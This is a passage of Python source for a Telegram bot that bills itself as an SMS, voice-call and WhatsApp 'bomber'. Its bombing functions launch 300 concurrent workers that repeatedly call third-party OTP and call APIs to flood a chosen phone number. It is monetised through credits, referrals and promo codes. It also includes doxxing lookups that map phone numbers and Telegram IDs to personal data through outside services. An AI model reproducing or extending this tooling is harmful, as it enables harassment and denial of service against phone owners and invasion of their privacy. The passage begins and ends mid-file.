        bot.send_message(user_id, "📄 **Page 2** – More commands:", parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))
        return
    elif text == "▶️ PAGE 3 ➡️":
        user_page[user_id] = 3
        bot.send_message(user_id, "📄 **Page 3** – Hosting & Referral Commands:", parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))
        return
    elif text == "◀️ BACK PAGE":
        if user_page.get(user_id, 1) == 3:
            user_page[user_id] = 2
        else:
            user_page[user_id] = 1
        bot.send_message(user_id, "📄 **Main menu**", parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))
        return
    elif text == "👑 ADMIN PANEL ⚙️":
        if user_id in ADMIN_IDS:
            bot.send_message(user_id, "👑 **ADMIN PANEL**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
        else:
            bot.send_message(user_id, "❌ Access denied.")
        return
    elif text == "👑 OWNER INFO ℹ️":
        owner_text = """
👑 **OWNER INFORMATION** 👑

📛 **Name:** 𝑨𝟒𝑿 𝑨𝑺𝑯
📱 **Telegram:** @OFFICIAL_ASH_X1
🔰 **Role:** Creator & Developer
💻 **Bot Version:** ULTIMATE v5.0 (Panel + Referral + Spinner)
🚀 **Powered by:** 𝑨𝟒𝑿 𝑨𝑺𝑯
🛡️ **Anti-Tamper:** Active
⚡ **APIs Loaded:** 1100+
        """
        bot.send_message(user_id, owner_text, parse_mode="Markdown")
        return
    elif text == "🤖 BOT INFO 📡":
        bot_info = """
🤖 **BOT INFORMATION** 🤖

📌 **Name:** SMS/CALL/WHATSAPP BOMBER
👑 **Owner:** @HACKER_XD01
📡 **Version:** 5.0 (Panel + Referral + Spinner)
⚔️ **Features:**
- 1100+ Working APIs
- Voice Call Bombing
- WhatsApp Bombing
- SMS Bombing
- Daily Bonus Spinner (1-10 credits)
- Hosting Panel Management
- Referral System (25 credits each)
- Leaderboard
- Number Lookup (OSINT)
- Telegram Chat ID → Phone Number
- Username → User ID
- Panel Code System

🔐 **Security:** Self-Destruct & Anti-Tamper Enabled
        """
        bot.send_message(user_id, bot_info, parse_mode="Markdown")
        return
    elif text == "🔍 NUMBER INFO 📞":
        if not is_joined(user_id):
            text = "🚫 **Join the channel first to use this feature:**\nhttps://t.me/osinttovdhvd\n\nThen click the button again."
            bot.send_message(user_id, text, parse_mode="Markdown")
            return
        user_states[user_id] = {"action": "number_info"}
        bot.send_message(user_id, "📞 **SEND 10 DIGIT NUMBER** to get information:\n\nExample: `9876543210`", parse_mode="Markdown")
        return
    elif text == "🆔 TG ID TO NUMBER 📱":
        user_states[user_id] = {"action": "tg_id_lookup"}
        bot.send_message(user_id, "🆔 **Send Telegram Chat ID** (numeric):\n\nExample: `6884112825`", parse_mode="Markdown")
        return
    elif text == "🔍 USERNAME TO ID 👤":
        user_states[user_id] = {"action": "username_to_id"}
        bot.send_message(user_id, "🔍 **Send Telegram username** (with or without @):\n\nExample: `balrajsohal` or `@balrajsohal`", parse_mode="Markdown")
        return
    elif text == "🎫 REDEEM PANEL CODE":
        user_states[user_id] = {"action": "redeem_panel"}
        bot.send_message(user_id, "🎫 **REDEEM PANEL CODE**\n\nSend the panel code (starts with PNL):", parse_mode="Markdown")
        return

    if text == "🟢 START BOMB ⚔️":
        user = get_user(user_id)
        if user["credits"] < 10 and user_id not in ADMIN_IDS:
            bot.send_message(user_id, "❌ INSUFFICIENT CREDITS! You need at least 10 credits.\nGet daily bonus from main menu.", parse_mode="Markdown")
            return
        bot.send_message(user_id, "📱 **SEND 10 DIGIT NUMBER:**\n\nExample: `9876543210`", parse_mode="Markdown")
        bot.register_next_step_handler(m, attack_start)
    elif text == "🔴 STOP BOMB ⏹️":
        if user_id in bombing_status:
            bombing_status[user_id] = False
            bot.send_message(user_id, "⏹️ BOMBING STOPPED")
        else:
            bot.send_message(user_id, "❌ NO ACTIVE BOMBING")
    elif text == "💚 MY CREDITS 💰":
        user = get_user(user_id)
        panel_data = get_user_panels(user_id)
        bot.send_message(user_id, f"💰 **YOUR CREDITS:** `{user['credits']}`\n💳 **PANEL BALANCE:** `{panel_data['balance']}`\n⚔️ 1 BOMB = 10 CREDITS", parse_mode="Markdown")
    elif text == "✅ DAILY BONUS 🎁":
        user = get_user(user_id)
        today = datetime.now().strftime("%Y-%m-%d")
        if user.get("last_daily") == today:
            bot.send_message(user_id, "❌ ALREADY CLAIMED TODAY!\nCome back tomorrow for another spin!", parse_mode="Markdown")
            return
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🎰 SPIN NOW 🎲", callback_data="spin_daily"))
        bot.send_message(user_id, "🎡 **DAILY BONUS SPINNER** 🎡\n\nClick the button below to spin the wheel and win 1-10 credits!", reply_markup=markup)
    elif text == "🟢 REDEEM CODE 🎟️":
        user_states[user_id] = {"action": "redeem"}
        bot.send_message(user_id, "🎟️ **REDEEM CODE**\n\nSend the code (starts with BALRAJ):")
    elif text == "📊 MY STATS 📈":
        user = get_user(user_id)
        panel_data = get_user_panels(user_id)
        stats_text = f"""
📊 **YOUR STATS**

👤 **USER ID:** `{user_id}`
💰 **CREDITS:** `{user['credits']}`
💳 **PANEL BALANCE:** `{panel_data['balance']}`
⚔️ **TOTAL ATTACKS:** `{user.get('total_attacks', 0)}`
✅ **LAST DAILY:** `{user.get('last_daily', 'Never')}`
📦 **PANELS ADDED:** `{len(panel_data['panels'])}`
        """
        bot.send_message(user_id, stats_text, parse_mode="Markdown")
    elif text == "❓ HELP 🆘":
        help_text = """
❓ **HELP MENU** ❓
...........…..…..…………….........…….............
🟢 **BOMBING:**
🟢 START BOMB - Start bombing (cost: 10 credits)
🔴 STOP BOMB - Stop active bombing

💰 **CREDITS:**
💚 MY CREDITS - Check balance
✅ DAILY BONUS - Spin to win 1-10 credits daily
🟢 REDEEM CODE - Use promo code for credits
🎫 REDEEM PANEL CODE - Use panel wallet code

🎮 **PANEL MANAGEMENT:**
🎮 MY PANELS - List your hosting panels
💼 ADD PANEL - Add new panel (URL, API key)
💰 PANEL BALANCE - Check panel wallet balance
🎁 RECHARGE PANEL - Transfer bot credits to panel
📊 PANEL STATS - Panel usage statistics

🔗 **REFERRAL:**
🔗 MY REFERRAL - Get your unique referral code
🏆 LEADERBOARD - Top users ranking

📊 **STATS & INFO:**
📊 MY STATS - Your usage statistics
🆔 MY ID - Show user ID
👑 OWNER INFO - Contact owner
🤖 BOT INFO - Bot details

🔍 **TOOLS:**
🔍 NUMBER INFO - OSINT lookup (join @HACKER_XD01)
🆔 TG ID TO NUMBER - Get phone from chat ID
🔍 USERNAME TO ID - Get user ID from username

💡 **TIPS:**
• Each bomb costs 10 credits
• Spin daily bonus for free credits
• Refer friends for 25 credits each
• Use STOP button to end bombing
        """
        bot.send_message(user_id, help_text, parse_mode="Markdown")
    elif text == "🆔 MY ID 👤":
        bot.send_message(user_id, f"🆔 YOUR USER ID: `{user_id}`", parse_mode="Markdown")

    elif text == "🎮 MY PANELS 📋":
        panels = get_user_panels(user_id)["panels"]
        if not panels:
            bot.send_message(user_id, "❌ You have no panels added. Use `💼 ADD PANEL ➕` to add one.", parse_mode="Markdown")
            return
        msg = "📋 **YOUR HOSTING PANELS**\n\n"
        for i, p in enumerate(panels, 1):
            msg += f"{i}. **{p.get('name', 'Unnamed')}**\n   URL: `{p.get('url', 'N/A')}`\n   API Key: `{p.get('api_key', 'N/A')[:10]}...`\n\n"
        bot.send_message(user_id, msg, parse_mode="Markdown")
    elif text == "💼 ADD PANEL ➕":
        user_states[user_id] = {"action": "add_panel", "step": "name"}
        bot.send_message(user_id, "📝 **ADD NEW PANEL**\n\nSend the **panel name** (e.g., 'My Server 1'):")
    elif text == "💰 PANEL BALANCE":
        panel_balance = get_user_panels(user_id)["balance"]
        bot.send_message(user_id, f"💳 **YOUR PANEL WALLET BALANCE:** `{panel_balance}` credits\n\nUse `🎁 RECHARGE PANEL` to add credits from your main balance.", parse_mode="Markdown")
    elif text == "🎁 RECHARGE PANEL":
        user_states[user_id] = {"action": "recharge_panel", "step": "amount"}
        bot.send_message(user_id, "💸 **RECHARGE PANEL WALLET**\n\nHow many credits to transfer from your main balance to panel wallet?\n\nSend a number (max 10000):")
    elif text == "📊 PANEL STATS":
        bot.send_message(user_id, "📊 **PANEL STATS**\n\nFeature coming soon. This will show your panel usage, success rates, etc.")
    elif text == "🔗 MY REFERRAL":
        code = generate_referral_code(user_id)
        bot.send_message(user_id, f"🔗 **YOUR REFERRAL CODE**\n\n`{code}`\n\nShare this code with friends. When they start the bot with `/start {code}`, both of you get **25 free credits**!\n\nLink: `https://t.me/{bot.get_me().username}?start={code}`", parse_mode="Markdown")
    elif text == "🏆 LEADERBOARD":
        data = load_data()
        users = data["users"]
        sorted_users = sorted(users.items(), key=lambda x: x[1].get("credits", 0), reverse=True)[:10]
        leader_text = "🏆 **TOP 10 USERS BY CREDITS** 🏆\n\n"
        rank = 1
        for uid, info in sorted_users:
            name = info.get("first_name", "Unknown")[:15]
            credits = info.get("credits", 0)
            leader_text += f"{rank}. `{uid}` - **{name}** – {credits} credits\n"
            rank += 1
        if not sorted_users:
            leader_text = "No users yet."
        bot.send_message(user_id, leader_text, parse_mode="Markdown")

# ================= SPINNER CALLBACK (VISUAL WHEEL) =================
@bot.callback_query_handler(func=lambda call: call.data == "spin_daily")
def handle_spin(call):
    user_id = call.from_user.id
    today = datetime.now().strftime("%Y-%m-%d")
    user = get_user(user_id)

    if user.get("last_daily") == today:
        bot.answer_callback_query(call.id, "❌ You already claimed today's bonus!")
        bot.edit_message_text("❌ **Already Claimed Today!**\nCome back tomorrow.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        return

    wheel_frames = [
        "🎡 SPINNING... 🎡\n\n[ ⚙️ ] →  ?",
        "🎡 SPINNING... 🎡\n\n[ 🌀 ] →  ?",
        "🎡 SPINNING... 🎡\n\n[ 🎲 ] →  ?",
        "🎡 SPINNING... 🎡\n\n[ 🎰 ] →  ?",
        "🎡 SPINNING... 🎡\n\n[ 🔄 ] →  ?"
    ]
    msg = call.message
    for frame in wheel_frames:
        try:
            bot.edit_message_text(frame, msg.chat.id, msg.message_id, parse_mode="Markdown")
            time.sleep(0.4)
        except:
            pass

    credits_won = random.randint(1, 10)
    update_credits(user_id, credits_won)

    data = load_data()
    data["users"][str(user_id)]["last_daily"] = today
    save_data(data)

    new_balance = get_user(user_id)["credits"]
    result_text = f"""
🎉 **YOU WON {credits_won} CREDITS!** 🎉

💰 **NEW BALANCE:** {new_balance}

✨ Come back tomorrow for another spin! ✨
    """
    bot.edit_message_text(result_text, msg.chat.id, msg.message_id, parse_mode="Markdown")
    bot.answer_callback_query(call.id, f"You won {credits_won} credits!")

# ================= HANDLE ADMIN KEYBOARD BUTTONS =================
@bot.message_handler(func=lambda m: m.chat.id in ADMIN_IDS and m.text in [
    "📊 STATS 📈", "👥 USERS LIST 📋", "🎟️ GEN CODE 💚", "🎫 GEN PANEL CODE",
    "🚫 BAN USER ⛔", "✅ UNBAN USER 🔓", "💰 ADD CREDITS ➕", "♾️ UNLIMITED CREDITS 💚",
    "🔋 RECHARGE PANEL (ADMIN)", "🔍 FIND USER 🔎", "📜 BANNED LIST 🚫",
    "🔄 RESET ALL CREDITS 💢", "➕ ADD PROTECTED", "➖ REMOVE PROTECTED",
    "📋 PROTECTED LIST", "📢 BROADCAST", "🔙 BACK TO MAIN 🏠"
])
def handle_admin_buttons(m):
    user_id = m.chat.id
    text = m.text
    if text == "📊 STATS 📈":
        data = load_data()
        total_users = len(data["users"])
        banned_count = len(data.get("banned", []))
        total_credits = sum(u.get("credits", 0) for u in data["users"].values())
        total_attacks = sum(u.get("total_attacks", 0) for u in data["users"].values())
        panel_data = load_panels()
        total_panels = sum(len(p["panels"]) for p in panel_data["users"].values())
        stats_text = f"""
📊 **BOT STATISTICS** 📊

👥 **TOTAL USERS:** `{total_users}`
🚫 **BANNED USERS:** `{banned_count}`
💰 **TOTAL CREDITS:** `{total_credits}`
⚔️ **TOTAL ATTACKS:** `{total_attacks}`
📦 **TOTAL PANELS:** `{total_panels}`
🎯 **ACTIVE APIS:** `{len(APIS)}`
        """
        bot.send_message(user_id, stats_text, parse_mode="Markdown")
    elif text == "👥 USERS LIST 📋":
        data = load_data()
        users = data["users"]
        if not users:
            bot.send_message(user_id, "No users found")
            return
        users_text = "👥 **USERS LIST**\n\n"
        for uid, uinfo in list(users.items())[:20]:
            users_text += f"🆔 `{uid}` - 💰 {uinfo.get('credits', 0)} credits - ⚔️ {uinfo.get('total_attacks', 0)} attacks\n"
        if len(users) > 20:
            users_text += f"\n... and {len(users) - 20} more users"
        bot.send_message(user_id, users_text, parse_mode="Markdown")
    elif text == "🎟️ GEN CODE 💚":
        admin_states[user_id] = {"action": "gen_code", "step": "awaiting_amount"}
        bot.send_message(user_id, "🎟️ **GENERATE CREDIT CODE**\n\nSend the amount (max 1000 credits):")
    elif text == "🎫 GEN PANEL CODE":
        admin_states[user_id] = {"action": "gen_panel_code", "step": "awaiting_amount"}
        bot.send_message(user_id, "🎫 **GENERATE PANEL CODE**\n\nSend the amount (max 1000 panel balance):")
    elif text == "🚫 BAN USER ⛔":
        admin_states[user_id] = {"action": "ban_user", "step": "awaiting_user_id"}
        bot.send_message(user_id, "🚫 **BAN USER**\n\nSend the user ID to ban:")
    elif text == "✅ UNBAN USER 🔓":
        admin_states[user_id] = {"action": "unban_user", "step": "awaiting_user_id"}
        bot.send_message(user_id, "✅ **UNBAN USER**\n\nSend the user ID to unban:")
    elif text == "💰 ADD CREDITS ➕":
        admin_states[user_id] = {"action": "add_credits", "step": "awaiting_user_id"}
        bot.send_message(user_id, "💰 **ADD CREDITS**\n\nSend the user ID:")
    elif text == "♾️ UNLIMITED CREDITS 💚":
        update_credits(user_id, 999999)
        bot.send_message(user_id, "♾️ UNLIMITED CREDITS ADDED! (999,999)")
    elif text == "🔋 RECHARGE PANEL (ADMIN)":
        admin_states[user_id] = {"action": "admin_recharge_panel", "step": "awaiting_user_id"}
        bot.send_message(user_id, "🔋 **RECHARGE PANEL (ADMIN)**\n\nSend the user ID:")
    elif text == "🔍 FIND USER 🔎":
        admin_states[user_id] = {"action": "find_user", "step": "awaiting_user_id"}
        bot.send_message(user_id, "🔍 **FIND USER**\n\nSend the user ID to find:")
    elif text == "📜 BANNED LIST 🚫":
        data = load_data()
        banned = data.get("banned", [])
        if not banned:
            bot.send_message(user_id, "No banned users")
            return
        banned_text = "🚫 **BANNED USERS**\n\n"
        for uid in banned:
            banned_text += f"🆔 `{uid}`\n"
        bot.send_message(user_id, banned_text, parse_mode="Markdown")
    elif text == "🔄 RESET ALL CREDITS 💢":
        data = load_data()
        for uid in data["users"]:
            data["users"][uid]["credits"] = 0
        save_data(data)
        bot.send_message(user_id, "✅ All users' credits have been reset to 0.")
    elif text == "➕ ADD PROTECTED":
        admin_states[user_id] = {"action": "add_protected", "step": "awaiting_number"}
        bot.send_message(user_id, "🛡️ **ADD PROTECTED NUMBER**\n\nSend the 10-digit phone number to protect:")
    elif text == "➖ REMOVE PROTECTED":
        admin_states[user_id] = {"action": "remove_protected", "step": "awaiting_number"}
        bot.send_message(user_id, "❌ **REMOVE PROTECTED NUMBER**\n\nSend the 10-digit phone number to unprotect:")
    elif text == "📋 PROTECTED LIST":
        protected = load_protected()
        if not protected:
            bot.send_message(user_id, "📭 No protected numbers.")
        else:
            lines = "\n".join([f"📞 `{num}`" for num in protected])
            bot.send_message(user_id, f"🛡️ **PROTECTED NUMBERS**\n\n{lines}", parse_mode="Markdown")
    elif text == "📢 BROADCAST":
        admin_states[user_id] = {"action": "broadcast", "step": "awaiting_message"}
        bot.send_message(user_id, "📢 **BROADCAST MESSAGE**\n\nSend the message you want to broadcast to all users.\n(Use /cancel to abort)")
    elif text == "🔙 BACK TO MAIN 🏠":
        user_page[user_id] = 1
        bot.send_message(user_id, "🏠 **MAIN MENU**", parse_mode="Markdown", reply_markup=get_main_keyboard(user_id))

# ================= HANDLE TEXT INPUTS =================
@bot.message_handler(func=lambda m: True)
def handle_text_input(m):
    user_id = m.chat.id
    # Number info lookup (OSINT)
    if user_id in user_states and user_states[user_id].get("action") == "number_info":
        phone = m.text.strip()
        if not phone.isdigit() or len(phone) != 10:
            bot.send_message(user_id, "❌ Invalid number! Send 10 digits only.\nExample: `9876543210`", parse_mode="Markdown")
            del user_states[user_id]
            return
        api_url = "https://ayaanmods.site/number.php"
        api_key = "annonymous"
        params = {"key": api_key, "number": phone}
        try:
            res = requests.get(api_url, params=params, timeout=10)
            if res.status_code == 200:
                bot.send_message(user_id, f"📊 Result:\n{res.text}")
            else:
                bot.send_message(user_id, "❌ API Error")
        except Exception as e:
            bot.send_message(user_id, "⚠️ Request Failed")
        del user_states[user_id]
        return

    # TG ID to Phone Number lookup
    if user_id in user_states and user_states[user_id].get("action") == "tg_id_lookup":
        chat_id_input = m.text.strip()
        if not chat_id_input.isdigit():
            bot.send_message(user_id, "❌ Invalid Chat ID! Send a numeric ID.\nExample: `6884112825`", parse_mode="Markdown")
            del user_states[user_id]
            return
        api_url = f"https://tgchatid.vercel.app/api/lookup?number={chat_id_input}"
        try:
            res = requests.get(api_url, timeout=10)
            if res.status_code == 200:
                data = res.json()
                phone = data.get("phone", "Not found")
                if phone and phone != "Not found":
                    bot.send_message(user_id, f"✅ **Phone Number for Chat ID `{chat_id_input}`**\n📞 `{phone}`", parse_mode="Markdown")
                else:
                    bot.send_message(user_id, f"❌ No phone number found for Chat ID `{chat_id_input}`", parse_mode="Markdown")
            else:
                bot.send_message(user_id, "❌ API Error. Try again later.")
        except Exception as e:
            bot.send_message(user_id, "⚠️ Request failed. Check your connection.")
        del user_states[user_id]
        return

    # Username to User ID lookup
    if user_id in user_states and user_states[user_id].get("action") == "username_to_id":
        username = m.text.strip().replace("@", "").strip()
        if not username:
            bot.send_message(user_id, "❌ Invalid username. Send a valid Telegram username (e.g., balrajsohal)", parse_mode="Markdown")
            del user_states[user_id]
            return
        try:
            chat = bot.get_chat(f"@{username}")
            target_id = chat.id
            first_name = chat.first_name or ""
            last_name = chat.last_name or ""
            full_name = f"{first_name} {last_name}".strip()
            bot.send_message(user_id, f"✅ **User Found**\n\n👤 Username: @{username}\n🆔 User ID: `{target_id}`\n📛 Name: {full_name}", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(user_id, f"❌ Could not find user `{username}`. Make sure the username exists and the bot can see it.", parse_mode="Markdown")
        del user_states[user_id]
        return

    # Redeem normal credit code
    if user_id in user_states and user_states[user_id].get("action") == "redeem":
        code = m.text.strip().upper()
        data = load_data()
        if "codes" not in data or code not in data["codes"]:
            bot.send_message(user_id, "❌ INVALID CODE!", parse_mode="Markdown")
        else:
            amount = data["codes"].pop(code)
            save_data(data)
            new_balance = update_credits(user_id, amount)
            bot.send_message(user_id, f"✅ +{amount} CREDITS!\n💰 NEW BALANCE: {new_balance}", parse_mode="Markdown")
        del user_states[user_id]
        return

    # Redeem panel code
    if user_id in user_states and user_states[user_id].get("action") == "redeem_panel":
        code = m.text.strip().upper()
        data = load_data()
        if "panel_codes" not in data or code not in data["panel_codes"]:
            bot.send_message(user_id, "❌ INVALID PANEL CODE!", parse_mode="Markdown")
        else:
            amount = data["panel_codes"].pop(code)
            save_data(data)
            update_panel_balance(user_id, amount)
            new_balance = get_user_panels(user_id)["balance"]
            bot.send_message(user_id, f"✅ +{amount} PANEL CREDITS!\n💳 NEW PANEL BALANCE: {new_balance}", parse_mode="Markdown")
        del user_states[user_id]
        return

    # Add Panel - step by step
    if user_id in user_states and user_states[user_id].get("action") == "add_panel":
        state = user_states[user_id]
        if state["step"] == "name":
            panel_name = m.text.strip()
            state["name"] = panel_name
            state["step"] = "url"
            bot.send_message(user_id, "🌐 Send the **panel URL** (e.g., `https://yourpanel.com`):")
        elif state["step"] == "url":
            panel_url = m.text.strip()
            state["url"] = panel_url
            state["step"] = "api_key"
            bot.send_message(user_id, "🔑 Send the **API key** for this panel:")
        elif state["step"] == "api_key":
            api_key = m.text.strip()
            panel_info = {
                "name": state["name"],
                "url": state["url"],
                "api_key": api_key,
                "added_on": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            add_user_panel(user_id, panel_info)
            bot.send_message(user_id, f"✅ **Panel Added Successfully!**\n\nName: {panel_info['name']}\nURL: {panel_info['url']}\n\nUse `🎮 MY PANELS 📋` to view.", parse_mode="Markdown")
            del user_states[user_id]

    # Recharge Panel (user transfers credits to panel wallet)
    if user_id in user_states and user_states[user_id].get("action") == "recharge_panel":
        if user_states[user_id]["step"] == "amount":
            try:
                amount = int(m.text.strip())
                if amount < 1:
                    raise ValueError
                user = get_user(user_id)
                if user["credits"] < amount:
                    bot.send_message(user_id, f"❌ Insufficient credits! You have only {user['credits']} credits.")
                    del user_states[user_id]
                    return
                update_credits(user_id, -amount)
                update_panel_balance(user_id, amount)
                bot.send_message(user_id, f"✅ Transferred `{amount}` credits to your panel wallet.\n\n💰 Main balance: {user['credits'] - amount}\n💳 Panel balance: {get_user_panels(user_id)['balance']}", parse_mode="Markdown")
                del user_states[user_id]
            except ValueError:
                bot.send_message(user_id, "❌ Invalid amount. Send a number greater than 0.")
        return

    # Admin steps
    if user_id in ADMIN_IDS and user_id in admin_states:
        state = admin_states[user_id]
        action = state["action"]
        text = m.text.strip()

        if action == "gen_code" and state["step"] == "awaiting_amount":
            try:
                amount = int(text)
                if amount > 1000:
                    bot.send_message(user_id, "❌ Max 1000 credits per code.")
                    del admin_states[user_id]
                    return
                random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                code = "BALRAJ" + random_part
                data = load_data()
                if "codes" not in data:
                    data["codes"] = {}
                data["codes"][code] = amount
                save_data(data)
                bot.send_message(user_id, f"✅ CODE: `{code}`\n💰 AMOUNT: {amount}", parse_mode="Markdown")
                del admin_states[user_id]
            except ValueError:
                bot.send_message(user_id, "❌ Invalid number.")
        elif action == "gen_panel_code" and state["step"] == "awaiting_amount":
            try:
                amount = int(text)
                if amount > 1000:
                    bot.send_message(user_id, "❌ Max 1000 panel credits per code.")
                    del admin_states[user_id]
                    return
                random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                code = "PNL" + random_part
                data = load_data()
                if "panel_codes" not in data:
                    data["panel_codes"] = {}
                data["panel_codes"][code] = amount
                save_data(data)
                bot.send_message(user_id, f"✅ PANEL CODE: `{code}`\n💳 AMOUNT: {amount} panel credits", parse_mode="Markdown")
                del admin_states[user_id]
            except ValueError:
                bot.send_message(user_id, "❌ Invalid number.")
        elif action == "ban_user" and state["step"] == "awaiting_user_id":
            target_id = text
            data = load_data()
            if "banned" not in data:
                data["banned"] = []
            if target_id not in data["banned"]:
                data["banned"].append(target_id)
                save_data(data)
            bot.send_message(user_id, f"✅ BANNED: {target_id}")
            del admin_states[user_id]
        elif action == "unban_user" and state["step"] == "awaiting_user_id":
            target_id = text
            data = load_data()
            if "banned" in data and target_id in data["banned"]:
                data["banned"].remove(target_id)
                save_data(data)
            bot.send_message(user_id, f"✅ UNBANNED: {target_id}")
            del admin_states[user_id]
        elif action == "add_credits" and state["step"] == "awaiting_user_id":
            target_id = text
            admin_states[user_id] = {"action": "add_credits", "step": "awaiting_amount", "target_id": target_id}
            bot.send_message(user_id, f"💰 **ADD CREDITS**\n\nUser ID: `{target_id}`\nNow send the amount to add:")
        elif action == "add_credits" and state["step"] == "awaiting_amount":
            target_id = state["target_id"]
            try:
                amount = int(text)
                new_balance = update_credits(target_id, amount)
                bot.send_message(user_id, f"✅ Added {amount} credits to {target_id}\nNew balance: {new_balance}")
                del admin_states[user_id]
            except ValueError:
                bot.send_message(user_id, "❌ Invalid amount.")
        elif action == "admin_recharge_panel" and state["step"] == "awaiting_user_id":
            target_id = text
            admin_states[user_id] = {"action": "admin_recharge_panel", "step": "awaiting_amount", "target_id": target_id}
            bot.send_message(user_id, f"🔋 **RECHARGE PANEL**\n\nUser ID: `{target_id}`\nSend the amount of panel credits to add:")
        elif action == "admin_recharge_panel" and state["step"] == "awaiting_amount":
            target_id = state["target_id"]
            try:
                amount = int(text)
                update_panel_balance(target_id, amount)
                bot.send_message(user_id, f"✅ Added {amount} panel credits to {target_id}\nNew panel balance: {get_user_panels(target_id)['balance']}")
                del admin_states[user_id]
            except ValueError:
                bot.send_message(user_id, "❌ Invalid amount.")
        elif action == "find_user" and state["step"] == "awaiting_user_id":
            target_id = text
            data = load_data()
            if target_id not in data["users"]:
                bot.send_message(user_id, f"❌ User {target_id} not found!")
                del admin_states[user_id]
                return
            user = data["users"][target_id]
            panel_data = get_user_panels(target_id)
            user_info = f"""
👤 **USER FOUND**

🆔 **ID:** `{target_id}`
💰 **Credits:** `{user.get('credits', 0)}`
💳 **Panel Balance:** `{panel_data['balance']}`
⚔️ **Attacks:** `{user.get('total_attacks', 0)}`
✅ **Last Daily:** `{user.get('last_daily', 'Never')}`
📝 **Username:** @{user.get('username', 'N/A')}
👤 **Name:** {user.get('first_name', 'N/A')}
📦 **Panels:** `{len(panel_data['panels'])}`
            """
            bot.send_message(user_id, user_info, parse_mode="Markdown")
            del admin_states[user_id]
        elif action == "add_protected" and state["step"] == "awaiting_number":
            phone = m.text.strip()
            if not phone.isdigit() or len(phone) != 10:
                bot.send_message(user_id, "❌ Invalid number. Send exactly 10 digits.")
            else:
                if add_protected_number(phone):
                    bot.send_message(user_id, f"✅ `{phone}` added to protected list.")
                else:
                    bot.send_message(user_id, f"⚠️ `{phone}` is already protected.")
            del admin_states[user_id]
        elif action == "remove_protected" and state["step"] == "awaiting_number":
            phone = m.text.strip()
            if not phone.isdigit() or len(phone) != 10:
                bot.send_message(user_id, "❌ Invalid number. Send exactly 10 digits.")
            else:
                if remove_protected_number(phone):
                    bot.send_message(user_id, f"✅ `{phone}` removed from protected list.")
                else:
                    bot.send_message(user_id, f"⚠️ `{phone}` was not in protected list.")
            del admin_states[user_id]
        elif action == "broadcast" and state["step"] == "awaiting_message":
            broadcast_msg = text
            data = load_data()
            total_sent = 0
            failed = 0
            for uid in data["users"].keys():
                try:
                    bot.send_message(uid, f"📢 **BROADCAST FROM ADMIN**\n\n{broadcast_msg}", parse_mode="Markdown")
                    total_sent += 1
                    time.sleep(0.05)
                except:
                    failed += 1
            bot.send_message(user_id, f"✅ Broadcast sent!\n📨 Delivered: {total_sent}\n❌ Failed: {failed}")
            del admin_states[user_id]

# ================= BOMBING FUNCTIONS (ULTRA FAST) =================
async def send_request(session, api, phone):
    try:
        url = api["url"].format(phone=phone) if isinstance(api["url"], str) and "{phone}" in api["url"] else api["url"]
        # FIXED: Check if api["url"] is callable
        if callable(api["url"]):
            url = api["url"](phone)
        headers = api["headers"].copy()
        method = api["method"]
        post_body = None
        if api.get("data") and callable(api["data"]):
            post_body = api["data"](phone)
        else:
            post_body = make_data(phone, api["name"])
        if method == "POST":
            async with session.post(url, headers=headers, data=post_body, timeout=3) as r:
                return (r.status, api["name"])
        else:
            async with session.get(url, headers=headers, timeout=3) as r:
                return (r.status, api["name"])
    except:
        return (None, api["name"])

async def run_bomber(chat_id, phone):
    if is_protected(phone):
        bot.send_message(chat_id, "⚠️ **This number is PROTECTED by admin.**\nBombing not allowed!", parse_mode="Markdown")
        bombing_status[chat_id] = False
        return

    bombing_status[chat_id] = True
    user = get_user(chat_id)
    if user["credits"] < 10 and chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ NEED 10 CREDITS!\nGet daily bonus from main menu.", parse_mode="Markdown")
        return
    elif chat_id not in ADMIN_IDS:
        update_credits(chat_id, -10)
        user = get_user(chat_id)

    data = load_data()
    data["users"][str(chat_id)]["total_attacks"] = data["users"][str(chat_id)].get("total_attacks", 0) + 1
    save_data(data)

    msg = bot.send_message(chat_id, f"⚔️ **BOMBING STARTED** ⚔️\n\n📱 TARGET: `{phone}`\n💳 CREDITS USED: 10\n📡 STATUS: ACTIVE\n\n📨 SMS: 0\n📞 CALLS: 0\n📱 WA: 0", parse_mode="Markdown")

    sms_count = 0
    call_count = 0
    whatsapp_count = 0
    total_sent = 0
    formats = [phone, "91" + phone, "+91" + phone]

    async def worker(session):
        nonlocal sms_count, call_count, whatsapp_count, total_sent
        while bombing_status.get(chat_id, True):
            if chat_id not in ADMIN_IDS:
                user = get_user(chat_id)
                if user["credits"] < 10:
                    bombing_status[chat_id] = False
                    break
            api = random.choice(APIS)
            target = random.choice(formats)
            status, name = await send_request(session, api, target)
            if status in [200, 201, 202]:
                total_sent += 1
                lower_name = name.lower()
                if "call" in lower_name or "voice" in lower_name:
                    call_count += 1
                elif "whatsapp" in lower_name:
                    whatsapp_count += 1
                else:
                    sms_count += 1
            if total_sent % 20 == 0:
                try:
                    remaining = get_user(chat_id)["credits"] if chat_id not in ADMIN_IDS else "♾️"
                    bot.edit_message_text(
                        f"⚔️ **BOMBING** ⚔️\n\n📱 TARGET: `{phone}`\n"
                        f"📨 SMS: `{sms_count}`\n📞 CALLS: `{call_count}`\n📱 WA: `{whatsapp_count}`\n"
                        f"💰 CREDITS LEFT: `{remaining}`\n\n🔴 PRESS STOP TO END",
                        chat_id,
                        msg.message_id,
                        parse_mode="Markdown"
                    )
                except:
                    pass
            await asyncio.sleep(0)

    async with aiohttp.ClientSession() as session:
        workers = [asyncio.create_task(worker(session)) for _ in range(300)]
        await asyncio.gather(*workers, return_exceptions=True)

    try:
        bot.edit_message_text(
            f"✅ **BOMBING FINISHED** ✅\n\n📱 TARGET: `{phone}`\n"
            f"📨 TOTAL SMS: `{sms_count}`\n📞 TOTAL CALLS: `{call_count}`\n📱 TOTAL WA: `{whatsapp_count}`\n"
            f"💳 CREDITS USED: 10\n\n🟢 PRESS START AGAIN",
            chat_id,
            msg.message_id,
            parse_mode="Markdown"
        )
    except:
        pass

def attack_start(m):
